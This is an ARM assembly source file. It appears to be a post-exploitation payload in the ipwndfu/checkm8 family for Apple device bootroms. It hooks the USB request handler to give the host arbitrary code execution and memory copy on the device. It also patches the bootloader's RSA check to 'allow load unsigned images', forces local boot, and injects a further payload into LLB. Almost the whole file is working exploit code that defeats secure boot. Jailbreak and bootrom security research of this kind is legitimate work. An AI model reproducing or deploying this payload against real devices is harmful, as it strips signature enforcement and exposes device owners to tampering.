.text
@ base on "https://github.com/synackuk/ipwndfu/blob/1c349b9c5b06b398900e9afd6fe174ba43e2b8c5/src/usb_0xA1_2_armv7.S"
.pool
.set LOAD_ADDRESS,   0x10000000
.set EXEC_MAGIC,     0x65786563
.set MEMC_MAGIC,     0x6D656D63
.set EXCEPTION_VECTOR, 0xEA00000E
.set GET_BOOT_TRAMPOLINE, 0x6E85
.set JUMPTO, 0x5F81
.set DONE_MAGIC,     0x646F6E65
.set USB_CORE_DO_IO, 0x7621

.set iBootVer, 0x10000286 @ 3406
.set iOSXVer, 0x36303433
.set iOSXIIIVer, 0x312e3036 @ 60.1[0]

.set HOOK_ADDR, 0x100009b6
.set HOOK_PATCH, 0xbcf3f022

.set RSA_ADDR, 0x10010380
.set RSA_PATCH, 0x60182000

.set BOOTMODE_ADDR, 0x100150e4
.set BOOTMODE_PATCH, 0x47702000

.set PAYLOAD_START, 0x100233a0
.set PAYLOAD_PTR, 0x43434343
.set PAYLOAD_SZ, 0x44444444

.code 16
.global _main
_main:
jump_back:
BKPT #1
BKPT #1
BKPT #1
BKPT #1

LDRH R2, [R0]
MOVW R3, #0x2A1
CMP  R2, R3
BNE  jump_back

PUSH {R4-R7,LR}
ADD  R7, SP, #0xC
SUB  SP, SP, #0x10

MOV  R4, R0
LDR  R5, =LOAD_ADDRESS

MOVW R1, #0xFFFF
LDRH R2, [R4,#2]
CMP  R1, R2
BNE  request_done

LDRD  R0, R1, [R5]

LDR  R2, =EXEC_MAGIC
CMP  R0, R2
BNE  not_exec
CMP  R1, R2
BNE  not_exec

MOV  R1, #0
STRD R1, R1, [R5]

LDRD R0, R1, [R5, #0x20]
LDRD R2, R3, [R5, #0x28]
STRD R0, R1, [SP]
STRD R2, R3, [SP, #0x8]

LDRD R0, R1, [R5, #0x10]
LDRD R2, R3, [R5, #0x18]

LDR  R6, [R5, #0x8]
BLX  R6

LDR  R2, =DONE_MAGIC
STRD R0, R1, [R5,#0x8]
STRD R2, R2, [R5]

not_exec:
LDR  R2, =MEMC_MAGIC
CMP  R0, R2
BNE  not_memc
CMP  R1, R2
BNE  not_memc

MOV  R1, #0
STRD R1, R1, [R5]

LDRD R0, R1, [R5, #0x10]
LDR  R2, [R5, #0x18]
BL   memcpy

LDR  R2, =DONE_MAGIC
STRD R2, R2, [R5]
B    request_done

not_memc:
LDR  R2, =EXCEPTION_VECTOR
CMP  R0, R2
BNE  request_done

LDR R1, =iBootVer
LDR R3, [R1]
LDR R2, =iOSXVer        @ check iBoot-version with fu*king implementation
CMP R3, R2
BNE boot_image

ADD R1, #5
LDR R3, [R1]
LDR R2, =iOSXIIIVer     @ check iBoot-version with fu*king2 implementation
CMP R3, R2
BNE boot_image

LDR R1, =HOOK_ADDR      @ apply payload hook for LLB
LDR R2, =HOOK_PATCH
STR R2, [R1]

LDR R1, =RSA_ADDR       @ allow load unsigned images
LDR R2, =RSA_PATCH
STR R2, [R1]

LDR R1, =BOOTMODE_ADDR  @ apply force local boot to boot mode
LDR R2, =BOOTMODE_PATCH
STR R2, [R1]

MOV R3, #0
LDR R1, =PAYLOAD_START  @ write the payload for iBoot patch to LLB
LDR R2, =PAYLOAD_PTR

payload_loop:
LDR R4, [R2]
STR R4, [R1]
ADD R3, #4
LDR R4, =PAYLOAD_SZ
ADD R1, #4
ADD R2, #4
CMP R3, R4
BNE payload_loop

boot_image:
LDR R3, =GET_BOOT_TRAMPOLINE
BLX R3
MOV R1, R0
MOV R0, #0
LDR R2, =LOAD_ADDRESS
LDR R3, =JUMPTO
BLX R3


request_done:
MOV  R0, #0x80
MOV  R1, R5
LDRH R2, [R4,#6]
MOV  R3, #0
LDR  R4, =USB_CORE_DO_IO
BLX  R4

MOV  R0, #0
ADD  SP, SP, #0x10
POP  {R4-R7,PC}

memcpy:
CMP  R2, #4
BCC  memcpy_2

LDR  R3, [R1]
STR  R3, [R0]
ADD  R0, R0, #4
ADD  R1, R1, #4
SUB  R2, R2, #4
B    memcpy

memcpy_2:
CMP  R2, #2
BCC  memcpy_1

LDRH R3, [R1]
STRH R3, [R0]
ADD  R0, R0, #2
ADD  R1, R1, #2
SUB  R2, R2, #2

memcpy_1:
CBZ  R2, memcpy_done

LDRB R3, [R1]
STRB R3, [R0]
ADD  R0, R0, #1
ADD  R1, R1, #1
SUB  R2, R2, #1

memcpy_done:
BX   LR
